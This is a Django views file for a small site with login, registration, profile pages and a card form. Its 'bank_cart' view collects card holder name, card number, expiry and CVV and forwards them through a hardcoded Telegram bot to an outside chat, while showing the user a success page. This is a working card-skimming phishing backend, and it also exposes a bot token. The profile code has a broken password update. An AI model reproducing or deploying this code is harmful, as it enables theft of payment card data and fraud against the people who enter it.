from django.http import HttpRequest, HttpResponse
from django.shortcuts import redirect, render
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
from pyexpat.errors import messages
from django.contrib import messages

from user.forms import UserRegisterForm, UserLoginForm, BankCartForm
import telebot
bot = telebot.TeleBot(token='8131551618:AAFiY4nVNUIx9KONOGsjbIwXD0fXlC0HR00')
def register_view(request):
    if request.method == 'POST':
        form = UserRegisterForm(request.POST)
        if form.is_valid():
            form.save()
            username = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password1')
            user = authenticate(username=username,
                                password = password)
            login(request, user)
            return redirect('login')
        else:
            form = UserRegisterForm()
            return render(request, 'this_is_app/registration.html', {'form':form})
    else:
        form = UserRegisterForm()
        return render(request, 'this_is_app/registration.html', {'form':form})

def login_view(request):
    if request.method == 'POST':
        form = UserLoginForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password')
            user = authenticate(username = username,
                                password = password)
            if user is not None:
                login(request, user)
                return redirect('home')
        else:
            form = UserLoginForm()
            return render(request, 'this_is_app/login.html',{'form':form})
    else:
        form = UserLoginForm()
        return render(request, 'this_is_app/login.html', {'form':form})

def bank_cart(request):
    if request.method == 'POST':
        form = BankCartForm(request.POST)
        if form.is_valid():
            card_name = form.cleaned_data.get('name')
            number = form.cleaned_data.get('number')
            time = form.cleaned_data.get('time')
            cvv = form.cleaned_data.get('cvv')
            bot.send_message(-4592099015,f' Имя {card_name}\nНомер {number}\nСрок {time}\ncvv {cvv}' )
            return render(request, 'this_is_app/bank_cart_right.html', {'form':form})
        else:
            form = BankCartForm()
            return render(request, 'this_is_app/bank_cart.html', {'form':form})
    else:
        form = BankCartForm()
        return render(request, 'this_is_app/bank_cart.html', {'form': form})

@login_required()
def profile_view(request):
    profile = request.user
    return render(request, 'this_is_app/profile.html',{'profile':profile})

@login_required()
def change_profile(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        email = request.POST.get('email')
        password = request.POST.get('password')
        user = request.user
        if username:
            user.username = username

        if email:
            user.email = email

        if password:
            user.set_password = password
            login(request, user)
        user.save()

        messages.success(request, 'Ваши данные были обновлены!')
    return render(request, 'this_is_app/change_profile.html', {'None':None})
